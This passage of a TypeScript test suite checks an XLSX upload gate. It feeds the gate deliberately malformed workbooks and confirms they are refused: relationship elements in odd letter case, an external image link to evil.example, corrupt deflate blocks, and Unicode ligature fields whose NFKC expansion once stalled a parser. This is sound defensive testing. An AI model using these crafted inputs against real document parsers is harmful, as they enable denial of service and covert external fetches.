    ['the root relationships part', ROOT_RELS_PART],
    ['a reader part', SHEET_PART],
  ])('refuses %s whose stored block has a wrong NLEN as CORRUPT_FILE', (_label, name) => {
    const data = storedDeflateBlock(entryBytes(book, name), WRONG_NLEN);
    expectGateEntry(
      rawDeflateArchive(book, name, data),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.VIEW_MISMATCH,
      name,
    );
  });
});

const EXTERNAL_IMAGE_RELATIONSHIP = `Id="rId1" Type="${OFFICE_REL}/image" Target="https://evil.example/x.png" TargetMode="External"/>`;

/** A relationships part whose root is `root` and whose one child is `child`, both as written. */
function relsWithNames(root: string, child: string): string {
  return `${XML_DECLARATION}<${root} xmlns="${RELATIONSHIPS_NS}"><${child} ${EXTERNAL_IMAGE_RELATIONSHIP}</${root}>`;
}

// The walk reads Relationship and Relationships by their exact local names; a reader that
// ignores the case of element names would follow one the walk skipped.
describe('upload gate: relationships elements in another ASCII case', () => {
  it.each<[string, string, string, string]>([
    ['a lower-case Relationship', SHEET_RELS_PART, 'Relationships', 'relationship'],
    ['an upper-case root', SHEET_RELS_PART, 'RELATIONSHIPS', 'Relationship'],
    ['a prefixed upper-case Relationship', SHEET_RELS_PART, 'Relationships', 'r:RELATIONSHIP'],
    [
      'a lower-case root of a part not named .rels',
      OTHER_XML_PART,
      'relationships',
      'Relationship',
    ],
  ])('refuses %s as CORRUPT_FILE package-part', (_label, entry, root, child) => {
    const rels = relsWithNames(root, child).replace(
      `xmlns="${RELATIONSHIPS_NS}"`,
      `xmlns="${RELATIONSHIPS_NS}" xmlns:r="${RELATIONSHIPS_NS}"`,
    );
    expectGateEntry(
      buildXlsxFixture([BASIC_SHEET], { [entry]: rels }),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.PACKAGE_PART,
      entry,
    );
  });

  it.each<[string, string]>([
    [
      'a lower-case Relationship',
      relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replace(
        '</Relationships>',
        `<relationship Id="rId2" Type="${OFFICE_DOCUMENT_REL}" Target="${OTHER_PART}"/></Relationships>`,
      ),
    ],
    [
      'an upper-case root',
      relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replaceAll('Relationships', 'RELATIONSHIPS'),
    ],
  ])('refuses %s in the root relationships as CORRUPT_FILE root-rels', (_label, rootRels) => {
    expectGateEntry(
      withRootRels(rootRels, { [OTHER_PART]: '<workbook/>' }),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.ROOT_RELS,
      ROOT_RELS_PART,
    );
  });
});

// One budget per upload bounds the formula text the content scans read: every field raw,
// plus its NFKC form when that differs, in every part (MAX_FORMULA_SCAN_UNITS, or a lower
// maxFormulaScanUnits).
const FORMULA_PART = 'xl/x/a.xml';
// The code units the gate charges for this field: eight, its NFKC form being the same text.
const BUDGET_FIELD = 'SUM(1,2)';
// The costliest field shape measured among those NFKC changes (charged raw and in NFKC
// form): U+FDFB, whose NFKC form is eight code units, and an ideographic space, which
// NFKC turns into a space.
const COSTLY_FIELD_PAIR = '\ufdfb\u3000';
// The costliest field shape measured among those NFKC keeps (charged raw only, though
// every field is still normalised): a name of one combining mark (U+0345), which the
// scan normalises and upper-cases again, then a line separator (U+2028).
const COSTLY_SAME_FORM_PAIR = '\u0345\u2028';
// How many fields the closing review's upload held.
const NFKC_PROBE_FIELDS = 330;

/**
 * What the gate charges for a formula field of decoded text `text`: its code units, plus
 * those of its NFKC form when that differs.
 */
function formulaScanUnits(text: string): number {
  const normal = text.normalize('NFKC');
  return text.length + (normal === text ? 0 : normal.length);
}

/** A part whose root holds `count` formula fields of text `text`. */
function formulaFieldsPart(text: string, count: number, root = 'a'): string {
  return `${XML_DECLARATION}<${root}>${`<f>${text}</f>`.repeat(count)}</${root}>`;
}

/** The gate with a formula scan budget of `units`. */
function withFormulaBudget(units: number): GuardOpts {
  return { ...opts, maxFormulaScanUnits: units };
}

describe('upload gate: the formula scan budget', () => {
  const field = `<f>${BUDGET_FIELD}</f>`;
  const units = formulaScanUnits(BUDGET_FIELD);

  it('charges nothing for a workbook without formulas', () => {
    expect(catchGuard(buildXlsxFixture([BASIC_SHEET]), withFormulaBudget(0))).toBeNull();
  });

  // The scan reads the NFKC form of a field only when it differs from the raw text, so
  // only then is it charged too.
  it.each<[label: string, text: string, sameForm: boolean, charge: number]>([
    ['its raw text alone when NFKC keeps it', BUDGET_FIELD, true, BUDGET_FIELD.length],
    [
      'its raw text and its NFKC form when NFKC changes it',
      COSTLY_FIELD_PAIR,
      false,
      COSTLY_FIELD_PAIR.length + COSTLY_FIELD_PAIR.normalize('NFKC').length,
    ],
  ])('charges a field %s', (_label, text, sameForm, charge) => {
    const file = buildXlsxFixture([BASIC_SHEET], { [FORMULA_PART]: formulaFieldsPart(text, 1) });

    expect(text.normalize('NFKC') === text).toBe(sameForm);
    expect(catchGuard(file, withFormulaBudget(charge))).toBeNull();
    expect(catchGuard(file, withFormulaBudget(charge - 1))?.meta).toEqual({
      reason: UPLOAD_LIMIT_REASONS.FORMULA_SCAN_BUDGET,
      entry: FORMULA_PART,
      cap: charge - 1,
    });
  });

  // The upload that held the parse worker for 13 s (26 s from a relationships part, which
  // was scanned twice): fields of 32 768 U+FDFA, whose NFKC form is eighteen times longer,
  // in a part the reader never opens. The first field is refused before it is read.
  it.each([FORMULA_PART, 'xl/x/_rels/a.xml.rels'])(
    'refuses fields whose NFKC form is too long in %s as UNSAFE_CONTENT unsafe-formula',
    (entry) => {
      const ligatures = 'ﷺ'.repeat(MAX_FORMULA_TEXT_LENGTH);
      const file = buildXlsxFixture([BASIC_SHEET], {
        [entry]: formulaFieldsPart(ligatures, NFKC_PROBE_FIELDS),
      });

      expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry);
    },
  );

  // Each kept XML part is content-scanned once, by the package walk or by the content scan
  // of the other parts, so a budget of exactly its field passes and one unit less refuses.
  it.each<[label: string, entry: string, xml: string]>([
    [
      'a .rels name with a Relationships root',
      'xl/x/_rels/a.xml.rels',
      relsXml([]).replace('</Relationships>', `${field}</Relationships>`),
    ],
    ['a .rels name with another root', 'xl/x/_rels/a.xml.rels', formulaFieldsPart(BUDGET_FIELD, 1)],
    [
      'another name with a Relationships root',
      FORMULA_PART,
      relsXml([]).replace('</Relationships>', `${field}</Relationships>`),
    ],
    ['the content types part', '[Content_Types].xml', contentTypesXml(undefined, field)],
    [
      'the root relationships part',
      ROOT_RELS_PART,
      relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replace(
        '</Relationships>',
        `${field}</Relationships>`,
      ),
    ],
    ['a part of no other kind', FORMULA_PART, formulaFieldsPart(BUDGET_FIELD, 1)],
  ])('content-scans %s once', (_label, entry, xml) => {
    const file = buildXlsxFixture([BASIC_SHEET], { [entry]: xml });

    expect(catchGuard(file, withFormulaBudget(units))).toBeNull();
    const err = catchGuard(file, withFormulaBudget(units - 1));
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
    expect(err?.meta).toEqual({
      reason: UPLOAD_LIMIT_REASONS.FORMULA_SCAN_BUDGET,
      entry,
      cap: units - 1,
    });
  });

  it('charges the fields of the reader parts and of the other parts to one budget', () => {
    const definedNames = `<definedNames><definedName name="n">${BUDGET_FIELD}</definedName></definedNames>`;
    const file = buildXlsxFixture([BASIC_SHEET], {
      [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}${definedNames}</workbook>`,
      [FORMULA_PART]: formulaFieldsPart(BUDGET_FIELD, 1),
    });

    expect(catchGuard(file, withFormulaBudget(2 * units))).toBeNull();
    expect(catchGuard(file, withFormulaBudget(2 * units - 1))?.meta).toEqual({
      reason: UPLOAD_LIMIT_REASONS.FORMULA_SCAN_BUDGET,
      entry: FORMULA_PART,
      cap: 2 * units - 1,
    });
  });

  it('clamps a maxFormulaScanUnits above MAX_FORMULA_SCAN_UNITS', () => {
    const longField = 'A'.repeat(MAX_FORMULA_TEXT_LENGTH);
    const count = Math.floor(MAX_FORMULA_SCAN_UNITS / formulaScanUnits(longField)) + 1;
    const file = buildXlsxFixture([BASIC_SHEET], {
      [FORMULA_PART]: formulaFieldsPart(longField, count),
    });

    expect(catchGuard(file, withFormulaBudget(2 * MAX_FORMULA_SCAN_UNITS))?.meta).toEqual({
      reason: UPLOAD_LIMIT_REASONS.FORMULA_SCAN_BUDGET,
      entry: FORMULA_PART,
      cap: MAX_FORMULA_SCAN_UNITS,
    });
  });

  it('refuses formula fields past MAX_FORMULA_SCAN_UNITS split over a reader part and another part', () => {
    const longField = 'A'.repeat(MAX_FORMULA_TEXT_LENGTH);
    const fieldUnits = formulaScanUnits(longField);
    const half = Math.floor(MAX_FORMULA_SCAN_UNITS / fieldUnits / 2);
    const rest = Math.floor(MAX_FORMULA_SCAN_UNITS / fieldUnits) - half;
    const definedNames = Array.from(
      { length: half },
      (_, i) => `<definedName name="n${i}">${longField}</definedName>`,
    ).join('');
    const book = (otherFields: number): Buffer =>
      buildXlsxFixture([BASIC_SHEET], {
        [WORKBOOK_PART]: `${WORKBOOK_WITH_ONE_SHEET_START}<definedNames>${definedNames}</definedNames></workbook>`,
        [FORMULA_PART]: formulaFieldsPart(longField, otherFields),
      });

    expect(catchGuard(book(rest), opts)).toBeNull();
    const err = catchGuard(book(rest + 1), opts);
    expect(err?.code).toBe('PAYLOAD_TOO_LARGE');
    expect(err?.meta).toEqual({
      reason: UPLOAD_LIMIT_REASONS.FORMULA_SCAN_BUDGET,
      entry: FORMULA_PART,
      cap: MAX_FORMULA_SCAN_UNITS,
    });
  });

  // A part named .rels may be a worksheet whose own relationships part names an external
  // hyperlink: the package walk reads those ids before it content-scans the part, which
  // no later step scans again.
  it('refuses a picture naming an external hyperlink in a worksheet stored under a .rels name', () => {
    const sheetPart = 'xl/worksheets/s.rels';
    const file = buildXlsxFixture([BASIC_SHEET], {
      [sheetPart]: `${XML_DECLARATION}<worksheet xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_REL}"><sheetData/><picture r:id="rId1"/></worksheet>`,
      'xl/worksheets/_rels/s.rels.rels': relsXml([
        [HYPERLINK_REL, 'https://example.com/a'],
      ]).replace('/>', ' TargetMode="External"/>'),
    });

    expectGateEntry(file, 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART, sheetPart);
  });

  // A field NFKC keeps is charged half of what one NFKC changes may be, yet is still
  // normalised, so both kinds are filled to the budget. The wall-clock bound is enforced
  // in CI only (expectWithinBudget); locally the file is still read and accepted.
  it.each<[label: string, pair: string, sameForm: boolean]>([
    ['NFKC changes', COSTLY_FIELD_PAIR, false],
    ['NFKC keeps', COSTLY_SAME_FORM_PAIR, true],
  ])(
    'reads formula fields of the costliest shape measured that %s up to the budget',
    (_label, pair, sameForm) => {
      const fieldText = pair.repeat(
        Math.floor(MAX_FORMULA_TEXT_LENGTH / pair.normalize('NFKC').length),
      );
      const fieldUnits = formulaScanUnits(fieldText);
      const count = Math.floor(MAX_FORMULA_SCAN_UNITS / fieldUnits);
      const file = buildXlsxFixture([BASIC_SHEET], {
        [FORMULA_PART]: formulaFieldsPart(fieldText, count),
      });

      expect(fieldText.normalize('NFKC') === fieldText).toBe(sameForm);
      expect(fieldText.normalize('NFKC').length).toBeLessThanOrEqual(MAX_FORMULA_TEXT_LENGTH);
      expect(count * fieldUnits).toBeGreaterThan(MAX_FORMULA_SCAN_UNITS - fieldUnits);
      const started = performance.now();
      expect(catchGuard(file, opts)).toBeNull();
      expectWithinBudget(performance.now() - started, FORMULA_SCAN_BUDGET_MS);
    },
  );
});
